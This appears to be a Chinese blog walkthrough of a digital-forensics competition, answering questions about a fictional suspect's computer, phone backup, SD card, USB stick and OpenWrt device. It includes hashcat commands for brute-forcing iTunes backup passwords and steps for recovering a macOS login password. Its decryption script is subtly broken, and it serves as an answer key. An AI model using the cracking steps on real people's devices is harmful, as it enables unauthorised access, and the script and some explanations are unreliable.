src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170920953.png" alt="image-20231106144343927"></p><h3 id="29"><a href="#29" class="headerlink" title="29"></a>29</h3><pre><code>[单选题] 承上题，该档案的SHA-256哈希值是什么? (3分)A. a6eef1… …27364cB. 54785c… …fe86f0C. 961f2b… …647d55D. a00e6c… …d0eaabE. 以上皆非</code></pre><pre><code>B</code></pre><p>由上题我们可以看到这是用ftp协议传输的文件 我们选择导出对象——FTP-DATA 将下载的文件导出 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170920644.png" alt="image-20231106144438454"></p><p>计算哈希值</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170920335.png" alt="image-20231106144643573"></p><h2 id="王景浩计算机"><a href="#王景浩计算机" class="headerlink" title="王景浩计算机"></a>王景浩计算机</h2><h3 id="30"><a href="#30" class="headerlink" title="30"></a>30</h3><pre><code>[多选题] 通过取证调查结果迸行分析 (包括但不限于以上问题及情节)，以下哪项关于王景浩的推断是正确的? (5分)A. 曾经采用他的计算机入侵AGC集团网络B. 传播儿童色情物品C. 于AGC集团取得大量客户资料D. 通过VPN取得Rooney家里的IP地址E. 企图更改AGC集团的网页</code></pre><pre><code>ACDE</code></pre><h3 id="57"><a href="#57" class="headerlink" title="57"></a>57</h3><pre><code>[单选题] 王景浩的计算机使用什么文件系统 (File System) ? (1分)A. exFATB. APFSC. HFSD. HFS+</code></pre><pre><code>D</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170920918.png" alt="image-20231030160752112"></p><h3 id="58"><a href="#58" class="headerlink" title="58"></a>58</h3><pre><code>[单选题] 王景浩计算机的操作系统 (Operating System) 版本是什么? (1分)A. 10.4.11B. 10.9.5C. 10.10.5D. 10.11.6</code></pre><pre><code>D</code></pre><p>  <img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170920469.png" alt="image-20231029214523992"></p><h3 id="59"><a href="#59" class="headerlink" title="59"></a>59</h3><pre><code>[填空题] 王景浩的计算机当前有多少个用户 (包括访客 &#39;Guest&#39; )? (以阿拉伯数字回答) (1分)</code></pre><pre><code>6</code></pre><p>最后一个被删除了 所以还剩下6个</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170920059.png" alt="image-20231030160913453"></p><h3 id="60"><a href="#60" class="headerlink" title="60"></a>60</h3><pre><code>[填空题] 王景浩的计算机里有一个用户被删除，被删除的用户名称是什么? (以大写英文回答) (1分)</code></pre><pre><code>BROTHER</code></pre><p>接上题 </p><h3 id="61"><a href="#61" class="headerlink" title="61"></a>61</h3><pre><code>[填空题] 王景浩的计算机有多少个 &#39;聚焦&#39; 的搜索记録 (Spotlight Search) ? (以阿拉伯数字回答) (1分)</code></pre><pre><code>9</code></pre><p>直接搜</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170920828.png" alt="image-20231030163013764"></p><h3 id="62"><a href="#62" class="headerlink" title="62"></a>62</h3><pre><code>[单选题] 当用户设置了自动登录 (Auto Login) 后，王景浩计算机的操作系统会产生哪个档案? (2分)A. manifest.plistB. info.plistC. PasswordPanel.stringsD. kcpassword</code></pre><pre><code>D</code></pre><p>chatgpt做题法</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170920505.png" alt="image-20231030163845596"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170920413.png" alt="image-20231030163901984"></p><h3 id="63"><a href="#63" class="headerlink" title="63"></a>63</h3><pre><code>[单选题] 王景浩计算机的登录密码 (Login Password) 是什么? (2分)A. 1qa@WS3edB. 3ed$RF5tgC. 5tg^YH7ujD. 2ws$RF6yh</code></pre><p>按上题 直接去找<code>kcpassword</code>文件 全局搜索</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170921935.png" alt="image-20231030213948968"></p><p>但是这里打开是乱码  我们使用x-ways打开</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170921347.png" alt="image-20231102210546170"></p><h3 id="64"><a href="#64" class="headerlink" title="64"></a>64</h3><pre><code>[单选题] 在王景浩的计算机里，他最后使用哪个电邮地址登录 &#39;iCloud&#39; 账号? (2分)A. kinghoo0w0@gmail.comB. wonghoo588@yahoo.comC. kingho726@aol.comD. kinghoo0w0@yahoo.com</code></pre><pre><code>D</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170921496.png" alt="image-20231030183637429"></p><h3 id="65"><a href="#65" class="headerlink" title="65"></a>65</h3><pre><code>[多选题] 王景浩计算机里的手机备份 (iTunes Backup) 包含哪些iOS版本? (2分)A. 12.5.6B. 15.4C. 15.5D. 16.0.3</code></pre><pre><code>AC</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170921973.png" alt="image-20231029215559511"></p><h3 id="66"><a href="#66" class="headerlink" title="66"></a>66</h3><pre><code> [填空题] 王景浩曾经将一台 iPhone 6 连接他的计算机，请问它最后的连接时间是什么? (以时区UTC+8回答) (如答案为 2022-12-29 16:01:59，需回答 20221229160159) (2分)</code></pre><pre><code>20220819152402</code></pre><p>在火眼中找蓝牙连接信息 在已配对中找到一个 但是是王景浩ios备份中的iPhone XR</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311010831399.png" alt="image-20231101083110279"></p><p>又在未配对中找到一个iPhone 对应的应该是iPhone 6的手机系统</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311010832949.png" alt="image-20231101083253910"></p><h3 id="67"><a href="#67" class="headerlink" title="67"></a>67</h3><pre><code> [单选题] 苹果手机备份的密码 (iTunes Backup Encryption Password) 会记录在什么档案? (2分)A. Info.plistB. privacy.jsonC. Manifest.plistD. PasswordPanel.strings</code></pre><pre><code>C</code></pre><p>算是一个积累吧 对四个文件都进行了全局搜索 B是找不到的 找C的时候 看了一眼路径 里面提到Backup备份文件夹 感觉就八九不离十了</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311010846063.png" alt="image-20231101084635973"></p><p> 一共有两个这样的<code>Manifest.plist</code>文件 都是在Backup文件夹下的备份 将其提取出来 放在passwarekit中 竟然还能爆破密码 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311010848182.png" alt="image-20231101084840949"></p><h3 id="68"><a href="#68" class="headerlink" title="68"></a>68</h3><pre><code>[多选题] 以下哪种工具可以用作破解密码? (1分)A. PasswareB. John The RipperC. HashCatD. Password Recovery Toolkit</code></pre><pre><code>ABCD</code></pre><p>都是老熟人 都可以爆破密码</p><h3 id="69"><a href="#69" class="headerlink" title="69"></a>69</h3><pre><code>[多选题] 通过 &#39;hashcat&#39; 破解 &#39;iTunes Backup&#39; 密码需要制订一个 &#39;txt&#39; 档案，若该备份的手机iOS版本是10以上，需要按照下列哪个提示字符 (String) 的数据去制订这个 &#39;txt&#39; 档案? (3分)A. WPKYB. ITERC. SALTD. DPICE. DPSL</code></pre><pre><code>ABCDE</code></pre><p>找到一篇文章<a href="https://blog.changyy.org/2021/08/iphone-ios-itunes-backup-password-recovery-via-cracked.html">使用hashcat恢复IOS&#x2F;iPad备份密码</a>  里面有描述使用哪些字符去制定<code>txt</code>档案</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311010910389.png" alt="image-20231101091004341"></p><p>在这篇文章中也提到了在macos中ios备份的路径是<code>~/Library/Application Support/MobileSync/Backup/</code></p><p>同时 还提供了使用hashcat恢复备份文件密码的具体办法 下个脚本提取出密码的hash值 <a href="https://github.com/philsmd/itunes_backup2hashcat">恢复ios备份文件密码脚本</a> 在使用hashcat进行爆破 </p><pre><code>这里假设密码已知是四位数字 进行掩码爆破hashcat -d 1 -m 14800 hash.txt -a 3 &#39;?d?d?d?d&#39; # ios10以上的版本 使用14800参数hashcat -d 1 -m 14700 hash.txt -a 3 &#39;?d?d?d?d&#39; # ios9以前的版本 使用14700参数</code></pre><h3 id="70"><a href="#70" class="headerlink" title="70"></a>70</h3><pre><code>[填空题] 王景浩采用了4位数字加密了他的iPhone XR的备份，分析它的密码是什么? (以阿拉伯数字回答) (3分)</code></pre><pre><code>2022</code></pre><p>接上题 我们在这里使用passwarekit进行爆破密码即可</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311010950210.png" alt="image-20231101095020098"></p><h3 id="71"><a href="#71" class="headerlink" title="71"></a>71</h3><pre><code>[填空题] 最后一次连上王景浩计算机的3D打印机的IP 地址是什么? (不要输入答案中的 &#39;.&#39;，以阿拉伯数字回答) (2分)</code></pre><pre><code>1014140</code></pre><p>在无线网络信息中找到3D打印机的记录</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311011005304.png" alt="image-20231101100520253"></p><p>再在浏览器历史记录中找<code>2022-10-20 16:28:06</code> 时间左右的访问记录 第一条网页没打开 那就是第二个出现的url</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311011048149.png" alt="image-20231101104822096"></p><h3 id="72"><a href="#72" class="headerlink" title="72"></a>72</h3><pre><code>[填空题] 3D打印机最后一次在王景浩的计算机尝试打印的时间? (以时区UTC+8回答) (2分)</code></pre><pre><code>20221020162806</code></pre><p>接上题</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311011050308.png" alt="image-20231101105034260"></p><h3 id="73"><a href="#73" class="headerlink" title="73"></a>73</h3><pre><code>[单选题] 最后一次经由王景浩计算机打印的3D图档案名字是什么? (2分)A. CE3_balljoint_extender.gcodeB. um3-penguin-real-mini-keychain-merged-tpu.gcodeC. CE3_Prancer.gcodeD. CE3_2020-psu-atx-mount.gcode</code></pre><pre><code>D</code></pre><p>直接全局搜索了 找最后访问的时间最晚的 就是<code>CE3_2020-psu-atx-mount.gcode</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311011056018.png" alt="image-20231101105624963"></p><h3 id="74"><a href="#74" class="headerlink" title="74"></a>74</h3><pre><code>[单选题] 王景浩计算机的Safari浏览器的默认搜索引擎 (Default Search Engine) 是什么? (2分)A. 百度B. 谷歌C. 360D. Safari</code></pre><pre><code>B</code></pre><p>大部分搜索记录都是谷歌</p><h3 id="75"><a href="#75" class="headerlink" title="75"></a>75</h3><pre><code>[单选题] 分析王景浩计算机的数据，王景浩的比特币钱包 (Bitcoin Wallet) 地址是什么? (2分)A. bc1quw… ...zpzjztB. bc1qm… ...5f7n9gC. bc1q79… ...h4sq52D. bc1qsl… ...je7hkk</code></pre><pre><code>A</code></pre><p>在MacMail的附件中 找到一张收款码 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311011110321.png" alt="image-20231101111000265"></p><h3 id="76"><a href="#76" class="headerlink" title="76"></a>76</h3><pre><code>[单选题] AGC公司员工 &#39;Carson&#39; 有一个由公司发给他的电邮账户，分析王景浩的计算机数据并找出 &#39;Carson&#39; 的电邮账户密码。 (2分)A. AGC2020@pwB. AGC2012@PWC. AGC2020@hkgD. AGC2021@PW</code></pre><pre><code>A</code></pre><p> 其实在AGC的计算机中已经可以分析出来了</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311011125114.png" alt="image-20231101112522061"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311011125145.png" alt="image-20231101112532099"></p><h3 id="77"><a href="#77" class="headerlink" title="77"></a>77</h3><pre><code>[填空题] 王景浩曾经冒充AGC公司员工 &#39;Carson&#39; 发送电邮给AGC 客户，这封电邮的 &#39;Message-ID&#39; 是什么? 回答它的首８位数值。(以大写英文和阿拉伯数字回答，如 4GEF90GD) (2分)</code></pre><pre><code>004001D8</code></pre><p>在邮箱中其实能找到两封符合要求的邮件 但是查看十六进制 发现两封的message-id其实是一样的</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311011132104.png" alt="image-20231101113203050"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311011132694.png" alt="image-20231101113217642"></p><h3 id="78"><a href="#78" class="headerlink" title="78"></a>78</h3><pre><code>[多选题] 王景浩采用计算机里的哪种工具进入和盗取AGC公司的数据? (2分)A. TeamviewerB. OpenVPNC. Remote Desktop ManagerD. Tor Browser</code></pre><pre><code>ABC</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311011230232.png" alt="image-20231101123042186"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311011230424.png" alt="image-20231101123051372"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311011231174.png" alt="image-20231101123109123"></p><p>ABC三种软件计算机中都有 都是用来远程连接的 而王景浩是通过远程连接来入侵AGC公司的计算机的 所以三个都是  D洋葱浏览器是暗网浏览器 但是不会设计入侵外部计算机</p><h3 id="79"><a href="#79" class="headerlink" title="79"></a>79</h3><pre><code>[多选题] 王景浩在AGC公司盗取了下列什么类型的档案? (2分)A. ostB. xlsxC. jpgD. docx</code></pre><pre><code>AB</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311011237876.png" alt="image-20231101123706821"></p><h3 id="80"><a href="#80" class="headerlink" title="80"></a>80</h3><pre><code>[填空题] 王景浩的计算机于2022年9月29日曾经接上一个虚拟专用网络 (Virtual Private Network - VPN)，这个VPN的IP地址是什么? (不要输入答案中的 &#39;.&#39;，以阿拉伯数字回答) (2分)</code></pre><pre><code>61238217108</code></pre><p>接78题 王景浩是使用Openvpn伪造ip来进行入侵AGC计算机 那么AGC计算机上显示的远程桌面的客户端地址就是王景浩计算机连上的vpn的ip</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311011237876.png"></p><h3 id="81"><a href="#81" class="headerlink" title="81"></a>81</h3><pre><code>[填空题] 装置 &#39;「KingHoo」的iPhone&#39; 的蓝牙媒体访问控制地址 (MAC Address) 是什么? (不要输入答案中的 &#39;：&#39; 或 &#39;-&#39; ，以大写英文及阿拉伯数字回答) (1分)</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311012133804.png" alt="image-20231101213323717"></p><h3 id="82"><a href="#82" class="headerlink" title="82"></a>82</h3><pre><code>[单选题] 王景浩何时将 &#39;小宝&#39; 加为iPhone XR的手机联络人 (Contact) ? (以时区UTC +8回答) (1分)A. 2022年07月14日B. 2022年07月15日C. 2022年07月16日D. 2022年07月17日E. 2022年07月18日</code></pre><pre><code>A</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311012134847.png" alt="image-20231101213424803"></p><h3 id="83"><a href="#83" class="headerlink" title="83"></a>83</h3><pre><code>[单选题] 王景浩的iPhone XR显示他的汇丰银行户口于2022年9月19日收到多少存款? (1分)A. HKD298.8B. HKD344.7C. HKD396D. HKD543E. HKD465.1</code></pre><pre><code>B</code></pre><p> <img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311012134717.png" alt="image-20231101213457664"></p><h3 id="84"><a href="#84" class="headerlink" title="84"></a>84</h3><pre><code>[单选题] 王景浩的iPhone XR没有收藏 (Bookmark) 哪家音响品牌的网页? (1分)A. KEFB. EDIFIERC. BOSED. YAMAHAE. Bowers &amp; Wilkins</code></pre><pre><code>D</code></pre><p> <img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311012135756.png" alt="image-20231101213530700"></p><h3 id="85"><a href="#85" class="headerlink" title="85"></a>85</h3><pre><code>[单选题] 王景浩的iPhone XR手机记录了他曾于2022年8月26日试飞无人机， 当天试飞的地点在哪里? (2分)A. 大埔海滨B. 启德C. 数码港D. 西环E. 将军澳</code></pre><pre><code>D</code></pre><p>学到一点 无人机的文件夹在<code>AppDomain-com.dji.golite</code>中 将这个文件夹提取出来 放到物联取证大师中分析一下 找到2022年8月26日的飞行记录</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170921582.png" alt="image-20231102170934427"></p><p>可以看到这天飞行的大致经纬度 是<code>114.119986E 22.281744N</code> 直接在地图上进行搜索  发现靠近西环</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311021713245.png" alt="image-20231102171356197"></p><h3 id="86"><a href="#86" class="headerlink" title="86"></a>86</h3><pre><code>[单选题] 王景浩于2022年8月26日试飞无人机的总飞行时间 (Total Flight Time) 多久? (2分)A. 6分58秒B. 8分10秒C. 9分6秒D. 11分1秒E. 15分33秒</code></pre><p> 在物联取证大师处找到时间线 框选出8月26日主要的飞行时间段 在查看图表 从图表中看到8月26日总飞行时间差不多在9分钟左右(注意这个飞行时间是飞起来的时间 没飞起来不算 所以要看横轴以上的时间)</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311021828002.png" alt="image-20231102182816940"></p><h3 id="87"><a href="#87" class="headerlink" title="87"></a>87</h3><pre><code>[多选题] 王景浩用 iPhone XR 拍了一张照片&#39;IMG_0012.HEIC&#39;，那照片什么地方曾被修改? (3分)A. 拍摄时间B. 经纬度C. 时区D. 档案名称E. 拍摄装备</code></pre><pre><code>AB</code></pre><p>首先在火眼中找到目标照片 查看照片属性 发现其和在火眼中看到的日期不一样</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170921097.png" alt="image-20231102195620780"></p><h3 id="88"><a href="#88" class="headerlink" title="88"></a>88</h3><pre><code>[填空题] 承上题，那张照片修改后的经纬度是什么? (不要输入答案中的 &#39;.&#39;，将经纬度合并回答。 如 22.2846135 114.1739116，需回答 2228461351141739116) (3分)</code></pre><h2 id="王景浩SD卡"><a href="#王景浩SD卡" class="headerlink" title="王景浩SD卡"></a>王景浩SD卡</h2><h3 id="96"><a href="#96" class="headerlink" title="96"></a>96</h3><pre><code>[填空题] 王景浩 SD 记忆卡 (SD Memory Card) 的储存容量有多少个字节 (Byte) ? (以阿拉伯数字回答) (1分)</code></pre><pre><code>8004304896</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170921610.png" alt="image-20231102210928935"></p><h3 id="97"><a href="#97" class="headerlink" title="97"></a>97</h3><pre><code>[单选题] 检视记忆卡上硬盘分区表 (Partition Table) 资讯，记忆卡共有多少个分区 (Partition) ? (1分)A. 1B. 2C. 3D. 4E. 0</code></pre><pre><code>B</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170921462.png" alt="image-20231102202327557"></p><h3 id="98"><a href="#98" class="headerlink" title="98"></a>98</h3><pre><code>[单选题] 检视记忆卡上硬盘分区表资讯，第二个分区的分区代码 (Partition Code) 是什么? (1分)A. 07B. AFC. 0CD. 2BE. 01</code></pre><pre><code>A</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170921354.png" alt="image-20231103160858363"></p><h3 id="99"><a href="#99" class="headerlink" title="99"></a>99</h3><pre><code>[多选题] 记忆卡的档案不能被读取，记忆卡受损的原因包括? (2分)A. 目录项结构 (Directory Entry) 受损B. 启动扇区表 (Master Boot Record) 受损C. 文件分配表 (File Allocation Table - FAT) 受损D. 引导扇区 (Boot Sector) 受损E. 以上各项皆是</code></pre><pre><code>AB</code></pre><p>还是使用x-ways挂载磁盘进行分析打开分区1进行查看  发现很多文件都产生了USBc坏道</p><pre><code>USBC坏道是指USB存储设备中出现的坏道，这些坏道可能会导致数据无法读取或写入。USBC坏道的原因可能包括设备老化、频繁插拔、电压不稳定等。解决USBC坏道的方法包括使用磁盘检测工具扫描和修复坏道、更换USB存储设备等。</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170921127.png" alt="image-20231103161851518"></p><p>但是引导扇区和FAT是没有损坏的 所以选择AB</p><h3 id="100"><a href="#100" class="headerlink" title="100"></a>100</h3><pre><code>[填空题] 承上题，通过分析及手动恢复还原，记忆卡里有多少个出錯的情况出现? (以阿拉伯数字回答) (3分)</code></pre><pre><code>8</code></pre><p>查看出现USBc坏道的部分即可</p><h3 id="101"><a href="#101" class="headerlink" title="101"></a>101</h3><pre><code>[多选题] 记忆卡第一个文件系统 (File System) 中有一个图片档案，它的SHA-256哈希值是 ‘F7E003781456D2E01CFE0EB46988D5BB433ADF9841164BBB90BAC67C0C9B21AF’。该档案显示了哪些影像? (2分)A. 人B. 山C. 汽车D. 交通灯E. 天空</code></pre><pre><code>BE</code></pre><p>计算全部图片的哈希在找到目标哈希值对应的图片即可</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170921818.png" alt="image-20231103184143849"></p><h3 id="102"><a href="#102" class="headerlink" title="102"></a>102</h3><pre><code>[单选题] 检视记忆卡的数据，在2022年10月9日约中午12时5分至12时15分之间的录像 (Video) 中，曾经出现哪一个IP地址? (2分)A. 61.238.217.108B. 155.137.190.123C. 192.168.1.66D. 185.200.100.242E. 213.104.156.111</code></pre><pre><code>D</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170921902.png" alt="image-20231103184348582"></p><h3 id="103"><a href="#103" class="headerlink" title="103"></a>103</h3><pre><code>[填空题] 恢复还原后的记忆卡中，第二个文件系统显示有多少个空闲簇 (Free Cluster)? (以阿拉伯数字回答) (2分)</code></pre><h3 id="104"><a href="#104" class="headerlink" title="104"></a>104</h3><pre><code>[填空题] 记忆卡第一个文件系统中有一个视频档，它的SHA-256哈希值是 ‘847E1E5FEF64B49C8D689DC3537D619B87666619A7C1EF0CC821153641847C19’，这个视频的档数据存在文件系统 (File System) 的最后的簇号 (Last Cluster Number) 是什么? (以阿拉伯数字回答) (2分)</code></pre><h3 id="105"><a href="#105" class="headerlink" title="105"></a>105</h3><pre><code>[单选题] 尝试分析记忆卡数据結構受损的原因，通过合适的方法把数据恢复到原本没有出错的状况，记忆卡的SHA-256哈希值是什么？ (3分)A. E63DF0… …8627D3B. 3FD99E… …17B6DEC. 3BADAA… …666A8FD. BBB211… …E00710E. AA9E81… …2C04FE</code></pre><h2 id="王景浩记忆棒"><a href="#王景浩记忆棒" class="headerlink" title="王景浩记忆棒"></a>王景浩记忆棒</h2><h3 id="17"><a href="#17" class="headerlink" title="17"></a>17</h3><pre><code>[单选题] 王景浩的USB记忆棒里有一个 ‘Data’ 文件夹 (Folder)，它存有哪一种类型的密钥文件? (1分)A. pemB. cerC. crtD. keyE. 以上皆非</code></pre><pre><code>A</code></pre><p>是rsa的 所以是pem类型的密钥文件</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170922565.png" alt="image-20231108094608718"></p><h3 id="18"><a href="#18" class="headerlink" title="18"></a>18</h3><pre><code>[多选题] 承上题，‘Data’ 文件夹里有一个被加密了的档案，它是被哪一种加密方法加密? (2分)A. SymmetricB. PGPC. TwofishD. RSAE. Triple DES</code></pre><pre><code>AD</code></pre><p>在<code>King_Ho_USB.E01/KingH00/Data/Notes</code>有有关加密解密算法和密钥的文件 使用了rsa和Fernet(就是对称加密算法，即<code>Symmetric</code>)</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170922767.png" alt="image-20231108094934408"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170922429.png" alt="image-20231108094948839"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170922117.png" alt="image-20231108095006568"></p><h3 id="19"><a href="#19" class="headerlink" title="19"></a>19</h3><pre><code>[单选题] 尝试将档案解密，该档案属于哪一个类型 (File type)? (2分)A. exeB. odsC. rtfD. sqlE. 以上皆非</code></pre><pre><code>D</code></pre><p>参考上面的Decryption写一个解密脚本 </p><p>是仿照这个师傅写的 <a href="https://blog.csdn.net/WXjzcccc/article/details/128175094?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169940809816800185819605%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=169940809816800185819605&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~baidu_landing_v2~default-4-128175094-null-null.142%5Ev96%5Epc_search_result_base9&utm_term=2022%E5%B9%B4%E7%BE%8E%E4%BA%9A%E6%9D%AF%E5%9B%A2%E4%BD%93%E8%B5%9B&spm=1018.2226.3001.4187">22美亚杯团体赛</a></p><pre><code>import rsafrom cryptography import Fernetwith open(&#39;P1&#39;,&#39;rb&#39;) as f1:    a = f1.read()    k = rsa.PrivateKey.load_pkcs1(a)with open(&quot;minecraft.exe&quot;,&quot;rb&quot;) as ef:    V2 = ef.read(128)    V3 = ef.read()decrypted_key = rsa.decrypt(V2,K)cipher = Fernet(decrypted_key)decrypted_file=cipher.decrypt(V3)with open(&quot;decrypted_file.txt&quot;,&quot;wb&quot;) as fw:    fw.write(decrypted_file)</code></pre><p>运行解密  打开是一个sql备份文件</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170922150.png" alt="image-20231108100958476"></p><h3 id="20"><a href="#20" class="headerlink" title="20"></a>20</h3><pre><code>[多选题] 承上题，找出以下哪一个名字出现在该档案里? (3分)A. Armand ToB. Adam SmasherC. Beverly KotD. Huma ChanE. 以上皆非</code></pre><pre><code>AC</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170922409.png" alt="image-20231108101015809"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170927542.png" alt="image-20231108101031803"></p><h2 id="朗尼草莓计算机"><a href="#朗尼草莓计算机" class="headerlink" title="朗尼草莓计算机"></a>朗尼草莓计算机</h2><p>草莓计算机只有一个bin  只能手搓</p><h3 id="89"><a href="#89" class="headerlink" title="89"></a>89</h3><pre><code>[单选题] 朗尼草莓 (Raspberry) 计算机操作系统的主机名称 (hostname) 是什么? (1分)A. OpenWrtB. adminC. rootD. AsusRtE. DDwrt</code></pre><pre><code>A</code></pre><p>在upper\etc\config中 找到system文件</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170922661.png" alt="image-20231103190543616"></p><h3 id="90"><a href="#90" class="headerlink" title="90"></a>90</h3><pre><code>[多选题] 以下哪项对于朗尼草莓计算机操作系统的描述是正确的? (2分)A. LAN地址是 192.168.1.24B. 提供点对点隧道协议 (Point-to-Point Tunneling Protocol - PPTP) VPN服务C. WIFI登录密码为’OpenWrt’D. 提供网络时间协议 (NTP) 服务E. 时区设置相等于UTC+8</code></pre><pre><code>AE</code></pre><p>C选项 在\upper\etc\config\wireless 密码是59814785</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170922066.png" alt="image-20231103191712494"></p><p>A选项 在\upper\etc\config\network ip地址是192.168.1.24</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170922776.png" alt="image-20231103191938929"></p><p>B选项 不是用的p2p服务  是ssl服务</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170922923.png" alt="image-20231103192010345"></p><p>E和B选项也在\upper\etc\config\system HKT-8就是UTC+8 有ntp服务 但是没开启</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170922554.png" alt="image-20231103192244599"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170927370.png" alt="image-20231103192404097"></p><h3 id="91"><a href="#91" class="headerlink" title="91"></a>91</h3><pre><code>[多选题] 承上题，‘VPN’ 服务器的IP地址及端口 (Port) 是什么? (2分)A. IP地址 61.238.217.108B. IP地址 192.168.8.1C. IP地址 103.10.12.106D. 端口 33248E. 端口 1194F. 端口 1701</code></pre><pre><code>AE</code></pre><p>查看openvpn的配置 在\upper\etc\openvpn\jpVPN.auth中</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170922962.png" alt="image-20231103193804418"></p><h3 id="92"><a href="#92" class="headerlink" title="92"></a>92</h3><pre><code>[填空题] 朗尼草莓计算机操作系统设定了一个档案来储存系统的 ‘log_file’ ，档案名称是什么? (不要输入 ‘.’，以大写英文及阿拉伯数字回答。如 Cat10.jpg，需回答CAT10JPG) (2分)</code></pre><pre><code>SYSlog</code></pre><p>还是查看刚刚的系统配置文件</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170922770.png" alt="image-20231103194321411"></p><h3 id="93"><a href="#93" class="headerlink" title="93"></a>93</h3><pre><code>[单选题] 承上题，检视上述的档案，当中有几个IP地址曾经成功登录这个系统的 ‘VPN’ 服务? (3分)A. 1B. 2C. 3D. 4E. 0</code></pre><pre><code>B</code></pre><p>直接导出刚刚的<code>SYSlog</code>  放到notepad++中进行分析 搜索<code>password auth succeeded</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170922121.png" alt="image-20231103195136417"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170922504.png" alt="image-20231103195205861"></p><h3 id="94"><a href="#94" class="headerlink" title="94"></a>94</h3><pre><code>[单选题] 承上题，检视上述的档案，当中有几个IP地址曾经尝试以 ‘root’ 登入装置但因密码错误而不成功? (2分)A. 2B. 4C. 5D. 6E. 8</code></pre><pre><code>D</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170922321.png" alt="image-20231103195406410"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170922182.png" alt="image-20231103195458526"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170922979.png" alt="image-20231103195536511"></p><p><img 